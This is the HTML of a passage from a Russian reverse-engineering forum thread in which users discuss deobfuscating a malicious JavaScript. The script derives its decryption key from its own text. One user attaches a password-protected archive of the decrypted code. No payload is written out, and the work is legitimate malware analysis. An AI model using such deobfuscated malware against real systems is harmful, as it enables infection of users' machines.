<td width="83%" class="caption1 post"><span class=txtSm>Создано: 21 марта 2008 22:26 <br><script type="text/javascript">QU('arnix','Цитата','пишет');</script> &middot; <a href="?step=sendmsg&amp;action=pmail&amp;userto=arnix" target="_blank">Личное сообщение</a> &middot;  <a href="#26" onClick="prompt('Ссылка на сообщение', 'https://exelab.ru/f/action=vthread&amp;forum=6&amp;topic=11393&amp;page=0#26');return false;">#26</a> </span><div align=left><br>
<I>UsAr пишет:<br>есть такая программка malzilla, написанная специально для раскриптовки таких скриптов </I><br><br>Я щас копаюсь в этом скрипте (расшифровывал вручную), он использует для расшифровки финального кода который eval-иться в конце, как ключ сам себя, если переименовать переменные, расшифруется не правильно. Так что сначало нужно взять строку ключа чтобы использовать в скрипте.
<br><br><span class="txtGoods"><a href="action=addthx&amp;post=183868&amp;user=26&amp;forum_n=6&amp;topic=11393&amp;page=0&amp;anchor=26" class="addthx" data-post="183868"><img src="img/tu.png" border=0 title="Полезное сообщение"></a><span class="have_thx" style="display:none"> | Сообщение посчитали полезным: <span class="total_thx"></span></span></span><br></div></td>
</tr>

<tr valign=top class=tbCel1>
<td width="17%" class=caption1>
<div class=username><div><b><a name="27" onfocus="this.blur()" href="JavaScript:di('[b][HEX][/b]','')">[HEX]</a></b><br></div>
<img src="img/s7.gif" alt=""><br><img style="padding-top:3px;" src="av/2365.gif" alt=""><br><span class=txtSm>Ранг: 467.7 (мудрец), 5thx<br><span title='Сообщений в день (с регистрации) / За последний год / Лет с регистрации: 14.92'>Активность: 0.27<span style='color:red'>&searr;</span>0</span><br>Статус: <a href="action=userinfo&amp;user=2365">Участник</a><br><font color=blue>Иной :)</font></span></div>
<br>
</td>
<td width="83%" class="caption1 post"><span class=txtSm>Создано: 21 марта 2008 22:37 <br><script type="text/javascript">QU('[HEX]','Цитата','пишет');</script> &middot; <a href="?step=sendmsg&amp;action=pmail&amp;userto=[HEX]" target="_blank">Личное сообщение</a> &middot;  <a href="#27" onClick="prompt('Ссылка на сообщение', 'https://exelab.ru/f/action=vthread&amp;forum=6&amp;topic=11393&amp;page=0#27');return false;">#27</a> </span><div align=left><br>
<b>scripter</b><br>Там не длина, а само содержимое участвует в дишфровке. Если изменишь код, то и не расшифруешь.<br>Если расматривать пример <b>ToBad</b>, то в начале топика он постил кусок кода function lOaC(tFne)<br>Вот он и вычисляет типа хэша от шифрованого кода, а потом с помощью этого хэша и расшифровывает код. Так что тут нужно всего лишь вычислить реальный хэш не меняя скрипта <img src="img/smilies/s1.gif" alt=""> А потом уже с помощью хэша и распаковать код.<br><br><b>UsAr</b><br>Интересно. Нужно посмотреть на досуге. Надеюсь он не исполняет код, а только имеет какую то логику по дешифрации подобных скриптов иначе может где то глюкнуть и прощай система, здравствуй ботнет.
<br><br><font size="1"><i>-----<br>Computer Security Laboratory</i></font><br><br><span class="txtGoods"><a href="action=addthx&amp;post=183871&amp;user=2365&amp;forum_n=6&amp;topic=11393&amp;page=0&amp;anchor=27" class="addthx" data-post="183871"><img src="img/tu.png" border=0 title="Полезное сообщение"></a><span class="have_thx" style="display:none"> | Сообщение посчитали полезным: <span class="total_thx"></span></span></span><br></div></td>
</tr>

<tr valign=top class=tbCel2>
<td width="17%" class=caption1>
<div class=username><div><b><a name="28" onfocus="this.blur()" href="JavaScript:di('[b][HEX][/b]','')">[HEX]</a></b><br></div>
<img src="img/s7.gif" alt=""><br><img style="padding-top:3px;" src="av/2365.gif" alt=""><br><span class=txtSm>Ранг: 467.7 (мудрец), 5thx<br><span title='Сообщений в день (с регистрации) / За последний год / Лет с регистрации: 14.92'>Активность: 0.27<span style='color:red'>&searr;</span>0</span><br>Статус: <a href="action=userinfo&amp;user=2365">Участник</a><br><font color=blue>Иной :)</font></span></div>
<br>
</td>
<td width="83%" class="caption1 post"><span class=txtSm>Создано: 21 марта 2008 22:38 &middot; Поправил: [HEX] <br><script type="text/javascript">QU('[HEX]','Цитата','пишет');</script> &middot; <a href="?step=sendmsg&amp;action=pmail&amp;userto=[HEX]" target="_blank">Личное сообщение</a> &middot;  <a href="#28" onClick="prompt('Ссылка на сообщение', 'https://exelab.ru/f/action=vthread&amp;forum=6&amp;topic=11393&amp;page=0#28');return false;">#28</a> </span><div align=left><br>
<b>arnix</b><br>Все верно. Код менять нельзя иначе жопа. <img src="img/smilies/s8.gif" alt=""> Пиши обертку внешнию которая посчитает хэш от упакованого скрипта и потом уже тогда сможешь сам самостоятельно расшифровать.<br><br><b>4t</b><br>Ошибся топиком. Тут JS разбираем, а не пинчи (наверное). Тебе сюда <a href="http://exelab.ru/f/action=vthread&amp;forum=2&amp;topic=6500" target="_new">http://exelab.ru/f/action=vthread&amp;forum=2&amp;topic=6500</a>
<br><br><font size="1"><i>-----<br>Computer Security Laboratory</i></font><br><br><span class="txtGoods"><a href="action=addthx&amp;post=183872&amp;user=2365&amp;forum_n=6&amp;topic=11393&amp;page=0&amp;anchor=28" class="addthx" data-post="183872"><img src="img/tu.png" border=0 title="Полезное сообщение"></a><span class="have_thx" style="display:none"> | Сообщение посчитали полезным: <span class="total_thx"></span></span></span><br></div></td>
</tr>

<tr valign=top class=tbCel1>
<td width="17%" class=caption1>
<div class=username><div><b><a name="29" onfocus="this.blur()" href="JavaScript:di('[b]arnix[/b]','')">arnix</a></b><br></div>
<img src="img/s6.gif" alt=""><br><span class=txtSm>Ранг: 210.5 (наставник), 2thx<br><span title='Сообщений в день (с регистрации) / За последний год / Лет с регистрации: 15.96'>Активность: 0.14<span style='color:red'>&searr;</span>0</span><br>Статус: <a href="action=userinfo&amp;user=26">Участник</a></span></div>
<br>
</td>
<td width="83%" class="caption1 post"><span class=txtSm>Создано: 21 марта 2008 22:53 &middot; Поправил: arnix <br><script type="text/javascript">QU('arnix','Цитата','пишет');</script> &middot; <a href="?step=sendmsg&amp;action=pmail&amp;userto=arnix" target="_blank">Личное сообщение</a> &middot;  <a href="#29" onClick="prompt('Ссылка на сообщение', 'https://exelab.ru/f/action=vthread&amp;forum=6&amp;topic=11393&amp;page=0#29');return false;">#29</a> </span><div align=left><br>
вот, расшивровал, если кому-то интересно (так легче продолжить исследование) <img src="img/smilies/s1.gif" alt=""> но не проверял работает-ли (на vmware щас не могу тестить)<br><br>p.s<br>пароль: danger + unescape(&#039;%20%20%20&#039;);<br><br><br><img src="img/attach.gif" alt=""> <a href="./files/a3db_21.03.2008_CRACKLAB.rU.tgz">a3db_21.03.2008_CRACKLAB.rU.tgz</a> - Untitled.rar
<br><br><span class="txtGoods"><a href="action=addthx&amp;post=183874&amp;user=26&amp;forum_n=6&amp;topic=11393&amp;page=0&amp;anchor=29" class="addthx" data-post="183874"><img src="img/tu.png" border=0 title="Полезное сообщение"></a><span class="have_thx" style="display:none"> | Сообщение посчитали полезным: <span class="total_thx"></span></span></span><br></div></td>
</tr>

<tr valign=top class=tbCel2>
<td width="17%" class=caption1>
<div class=username><div><b><a name="30" onfocus="this.blur()" href="JavaScript:di('[b]arnix[/b]','')">arnix</a></b><br></div>
<img src="img/s6.gif" alt=""><br><span class=txtSm>Ранг: 210.5 (наставник), 2thx<br><span title='Сообщений в день (с регистрации) / За последний год / Лет с регистрации: 15.96'>Активность: 0.14<span style='color:red'>&searr;</span>0</span><br>Статус: <a href="action=userinfo&amp;user=26">Участник</a></span></div>
<br>
</td>
<td width="83%" class="caption1 post"><span class=txtSm>Создано: 21 марта 2008 23:12 <br><script type="text/javascript">QU('arnix','Цитата','пишет');</script> &middot; <a href="?step=sendmsg&amp;action=pmail&amp;userto=arnix" target="_blank">Личное сообщение</a> &middot;  <a href="#30" onClick="prompt('Ссылка на сообщение', 'https://exelab.ru/f/action=vthread&amp;forum=6&amp;topic=11393&amp;page=0#30');return false;">#30</a> </span><div align=left><br>
исправил ошибку<br><br><img src="img/attach.gif" alt=""> <a href="./files/a3db_21.03.2008_CRACKLAB.rU.tgz">a3db_21.03.2008_CRACKLAB.rU.tgz</a> - Untitled.rar
<br><br><span class="txtGoods"><a href="action=addthx&amp;post=183877&amp;user=26&amp;forum_n=6&amp;topic=11393&amp;page=0&amp;anchor=30" class="addthx" data-post="183877"><img src="img/tu.png" border=0 title="Полезное сообщение"></a><span class="have_thx" style="display:none"> | Сообщение посчитали полезным: <span class="total_thx"></span></span></span><br></div></td>
</tr>


</table>
<table class=tbTransparent><tr><td class=tbTransparent><span class=txtSm><b> .  <b>1</b> . <a href="action=vthread&amp;forum=6&amp;topic=11393&amp;page=1.html">2</a> . <a href="action=vthread&amp;forum=6&amp;topic=11393&amp;page=1.html">&gt;&gt;</a></b></span></td></tr></table>
<table class=forums><tr>
<td width=16 valign=top class=caption3><img src="./img/forum_icons/p.gif" width=16 height=16 alt=""></td>
<td width="100%" class=caption3><span class=header>&nbsp;<a href="../index.html"><b>eXeL@B</b></a> <b class=bulletHead>&#8212;&#8250;</b> <a href="action=vtopic&amp;forum=6&sortBy=0&page=0.html"><b>Программирование</b></a> <b class=bulletHead>&#8212;&#8250;</b> Помогите понять кусочек ява-скрипта</span></td>
</tr></table>
</div>
<a name=newreply></a>
<script type="text/javascript">
function check_form(f)
{
  f.elements['b1'].value = 'Отправка...';
  f.elements['b1'].disabled = true;
  return true;
}
</script>

<div align="center">
<form name="postMsg" action="#31" method="post" class="formStyle" enctype="multipart/form-data" onsubmit="return check_form(this);" onkeydown="ctrle(event, this)">
<table class="forums">

<tr>
<td class="caption2">
<span class="txtSm"><b>:: Ваш ответ</b></span>
</td>
</tr>
<tr>
<td class="caption7">

<img class="toolButton" src="./img/button_bold.gif" width="23" height="22" border="0" title="Жирный" alt="Жирный" onmouseover="window.status='Жирный'; return true" onmouseout="window.status=''; return true" onclick="JavaScript:di('[b]','[/b]');">&nbsp;
<img class="toolButton" src="./img/button_italic.gif" width="23" height="22" border="0" title="Курсив" alt="Курсив" onmouseover="window.status='Курсив'; return true" onmouseout="window.status=''; return true" onclick="JavaScript:di('[t]','[/t]');">&nbsp;
<img class="toolButton" src="./img/button_underlined.gif" width="23" height="22" border="0" title="Подчеркнутый" alt="Подчеркнутый" onmouseover="window.status='Подчеркнутый'; return true" onmouseout="window.status=''; return true" onclick="JavaScript:di('[u]','[/u]');">&nbsp;
<img class="toolButton" src="./img/button_strike.gif" width="23" height="22" border="0" title="Перечеркнутый" alt="Перечеркнутый" onmouseover="window.status='Перечеркнутый'; return true" onmouseout="window.status=''; return true" onclick="JavaScript:di('[s]','[/s]');">&nbsp;
<img class="toolButton" src="./img/button_code.gif" width="23" height="22" border="0" title="Код" alt="{mpf5}" onmouseover="window.status='Код'; return true" onmouseout="window.status=''; return true" onclick="JavaScript:di('[ASM]','[/ASM]');">&nbsp;
<img class="toolButton" src="./img/button_image.gif" width="23" height="22" border="0" title="Ссылка на картинку" alt="Код" onmouseover="window.status='Ссылка на картинку'; return true" onmouseout="window.status=''; return true" onclick="JavaScript:di('[img]','[/img]');">&nbsp;
<img class="toolButton" src="./img/button_url.gif" width="23" height="22" border="0" title="Вставить ссылку" alt="Вставить ссылку" onmouseover="window.status='Вставить ссылку'; return true" onmouseout="window.status=''; return true" onclick="JavaScript:di('[url=',']--&gt; Link &lt;--[/url]');">&nbsp;

<!-- mod by arnix start 
<select style="position: relative; top: -7; width: 150px;" id="addHighlightedCode" onchange="insertHl(this);">
<option value="0">Подсветка кода...</option>
<option value="asm">Assembler</option>
<option value="c">C</option>
<option value="cpp">C++</option>
<option value="pascal">Pascal</option>
<option value="delphi">Delphi</option>
<option value="php">PHP</option>
<option value="vb">Visual Basic</option>
</select>&nbsp;
 mod by arnix end -->

<br>
<a href="JavaScript:di(':s1:','');"><img src="./img/smilies/s1.gif" border="0" alt=":s1:"></a>
<a href="JavaScript:di(':s2:','');"><img src="./img/smilies/s2.gif" border="0" alt=":s2:"></a>
<a href="JavaScript:di(':s3:','');"><img src="./img/smilies/s3.gif" border="0" alt=":s3:"></a>
<a href="JavaScript:di(':s4:','');"><img src="./img/smilies/s4.gif" border="0" alt=":s4:"></a>
<a href="JavaScript:di(':s5:','');"><img src="./img/smilies/s5.gif" border="0" alt=":s5:"></a>
<a href="JavaScript:di(':s6:','');"><img src="./img/smilies/s6.gif" border="0" alt=":s6:"></a>
<a href="JavaScript:di(':s7:','');"><img src="./img/smilies/s7.gif" border="0" alt=":s7:"></a>
<a href="JavaScript:di(':s8:','');"><img src="./img/smilies/s8.gif" border="0" alt=":s8:"></a>
<a href="JavaScript:di(':s9:','');"><img src="./img/smilies/s9.gif" border="0" alt=":s9:"></a>
<a href="JavaScript:di(':s10:','');"><img src="./img/smilies/s10.gif" border="0" alt=":s10:"></a>
<a href="JavaScript:di(':s11:','');"><img src="./img/smilies/s11.gif" border="0" alt=":s11:"></a>
<a href="JavaScript:di(':s12:','');"><img src="./img/smilies/s12.gif" border="0" alt=":s12:"></a>
<a href="JavaScript:di(':s13:','');"><img src="./img/smilies/s13.gif" border="0" alt=":s13:"></a>
<a href="JavaScript:di(':s14:','');"><img src="./img/smilies/s14.gif" border="0" alt=":s14:"></a>
<a href="JavaScript:di(':s15:','');"><img src="./img/smilies/s15.gif" border="0" alt=":s15:"></a>
<a href="JavaScript:di(':s16:','');"><img src="./img/smilies/s16.gif" border="0" alt=":s16:"></a>
</td></tr>
<tr>
<td class="caption5"><textarea name="postText" rows="10" class="textForm" tabindex="2" style="width:100%"></textarea>
<BR><INPUT class="textForm" type="file" name="fileAttach"><BR><SMALL>Максимальный размер аттача: <b>500KB</b>.</SMALL>
<br><span class="txtSm"> </span>
</td>
</tr>
<tr>
<td class="caption7">
<table class=tbTransparent>
<tr valign=middle>
<td class=tbTransparent><span class=txtSm>Ваш логин: <b><a href="https://exelab.ru/f/action=userinfo&amp;user=55973">german1505</a></b>  &raquo; <a href="mode=logout">Выход</a> &raquo; <a href="?action=pmail"><b>ЛС</b></a></span></td>
</tr>
</table>

</td>
</tr>


<tr>
<td class="caption5"><input type="submit" value="Отправить сообщение" class="inputButton" name="b1" tabindex="5"></td>
</tr>
</table>
<input type="hidden" name="action" value="pthread">
<input type="hidden" name="forum" value="6">
<input type="hidden" name="topic" value="11393">
</form>
</div>
<script type="text/javascript" src="templates/vthread_logged.js"></script>
<div align=center><table class=tbTransparent><tr>
<td class=tbTransparent><span class=txtSm>      &nbsp;&nbsp;&nbsp;<a href="/f/forprint.php?topic_id=11393" title="Версия для печати"><img src="img/forprint.gif" border="0" alt="Для печати"> Для печати</a>&nbsp;</span></td>
</tr></table></div>
<br>
 
<br><br><br></center>

</div>
<div id="footer">Вы находитесь на EXELAB.rU</div>
<div id="footer_btns">
<a href="http://www.reactos.org" rel="nofollow" target="_blank"><img src="./images/react.png" height="31" width="88" border="0" title="" alt=""></a> <script type="text/javascript"><!--
document.write("<img src='//counter.yadro.ru/hit?t44.2;r"+
escape(document.referrer)+((typeof(screen)=="undefined")?"":
";s"+screen.width+"*"+screen.height+"*"+(screen.colorDepth?
screen.colorDepth:screen.pixelDepth))+";u"+escape(document.URL)+
";h"+escape(document.title.substring(0,80))+";"+Math.random()+
"' "+
"border='0' width='31' height='31'>")
//--></script>
</div>
</div>

</body></html>
